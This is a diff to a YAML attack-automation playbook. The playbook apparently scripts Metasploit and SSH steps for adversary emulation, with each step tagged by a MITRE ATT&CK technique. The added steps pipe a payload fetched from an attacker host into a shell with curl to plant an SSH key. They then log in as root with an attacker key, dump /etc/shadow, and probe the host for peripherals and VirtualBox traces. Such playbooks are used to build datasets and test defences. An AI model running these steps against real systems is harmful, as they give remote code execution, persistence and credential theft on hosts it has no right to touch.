@@ -255,6 +255,11 @@ commands:
     payload: cmd/unix/python/meterpreter/reverse_tcp
 
   - type: msf-session
+    stdapi: True
+    cmd: "getuid"
+    session: "root"
+
+  - type: msf-session
     cmd: shell
     session: "root"
 
@@ -295,40 +300,88 @@ commands:
       technique_name: "System Owner/User Discovery"
 
   - type: msf-session
-    cmd: cat /etc/shadow
     session: "root"
+    cmd: "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
+    metadata:
+      techniques: "T1105,T1098.004"
+      tactics: "Command and Control,Persistence,Privilege Escalation"
+      technique_name:"Ingress Tool Transfer,Account Manipulation: SSH Authorized Keys"
+
+  - type: sleep
+    seconds: 40
+
+  - type: msf-session
+    cmd: id
+    read: True
+    session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
+
+  - type: msf-session
+    cmd: exit
+    session: "root"
+
+  - type: msf-session
+    cmd: exit
+    session: "root"
+
+  - type: sleep
+    seconds: 30
+
+  - type: ssh
+    cmd: id
+    hostname: 192.42.0.254
+    port: 2222
+    username: root
+    key_filename: "/home/aecid/.ssh/attacker_key"
+    creates_session: "rootshell"
+    clear_cache: True
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
+      technique_name: "System Owner/User Discovery"
+
+  - type: ssh
+    cmd: pwd
+    session: "rootshell"
+
+  - type: ssh
+    cmd: cat /etc/shadow
+    session: "rootshell"
     metadata:
       techniques: "T1003.008"
       tactics: "Credential Access"
       technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow"
 
-  - type: msf-session
+  - type: ssh
     cmd: lspci
-    session: "root"
+    session: "rootshell"
     metadata:
       techniques: "T1120"
       tactics: "Discovery"
       technique_name: "Peripheral Device Discovery"
 
-  - type: msf-session
+  - type: ssh
     cmd: command -v lsusb
-    session: "root"
+    session: "rootshell"
     metadata:
       techniques: "T1120"
       tactics: "Discovery"
       technique_name: "Peripheral Device Discovery"
 
-  - type: msf-session
+  - type: ssh
     cmd: date
-    session: "root"
+    session: "rootshell"
     metadata:
       techniques: "T1124"
       tactics: "Discovery"
       technique_name: "System Time Discovery"
 
-  - type: msf-session
+  - type: ssh
     cmd: find /usr -name \*virtualbox\*
-    session: "root"
+    session: "rootshell"
     metadata:
       techniques: "T1497.001"
       tactics: "Defense Evasion, Discovery"
